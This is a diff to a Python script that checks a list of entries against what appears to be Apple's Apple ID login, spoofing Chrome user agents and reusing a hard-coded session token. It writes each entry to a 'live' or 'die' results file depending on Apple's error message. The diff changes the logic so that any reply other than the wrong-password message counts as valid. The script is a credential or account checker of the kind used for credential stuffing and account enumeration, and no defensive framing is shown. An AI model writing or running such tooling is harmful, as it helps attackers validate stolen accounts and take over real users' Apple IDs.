@@ -11,6 +11,7 @@ import os
 import time
 import sys
 import random as h
+import colorama as c
 from os import path as y
 # SET COLOR :
 red = c.Fore.LIGHTRED_EX
@@ -73,7 +74,7 @@ path = "/"
 requestUri = "/login.html"
 rv = "1"
 #scnt = "31b0020ec593370016a61dc388f8965e"
-scnt = "245d753256f3829f1a27f2db4c918cb6"
+scnt = "31b0020ec593370016a61dc388f8965e"
 view = "5"
 Mode_File = "r+"
 try:
@@ -90,18 +91,16 @@ try:
       my_fake_s = UserAgent() # GEN FAKE AGENT 
       headers = {'User-Agent': my_fake_s.chrome}
       connect = p.post(url,params=get_data,headers=headers).content
-      valid_msg = "Application has insufficient privileges to perform this action".encode()
+      # valid_msg = "Application has insufficient privileges to perform this action".encode()
       dia_msg = "Your Apple ID or password was entered incorrectly.".encode()
       #get_listed = get_email_validation["result"]
-      if (valid_msg in connect):
-        	print(time_full+green+"[+] Valid :>> "+i)
-        	save_valid = open("rzlt/live.txt","a+")
-        	save_valid.write(i)	
-      elif(dia_msg in connect):
+      if(dia_msg in connect):
         	print(time_full+red+"[-] Die :>> "+i)
         	save_invalid = open("rzlt/die.txt","a+")
         	save_invalid.write(i)
       else:
-          print(yellow+"[+] LIMITED :>> "+i)  
+          print(time_full+green+"[+] Valid :>> "+i)
+          save_valid = open("rzlt/live.txt","a+")
+          save_valid.write(i)   
 except IOError as e:
   print("[-_-] We have ERROR FILE :>> "+str(e))
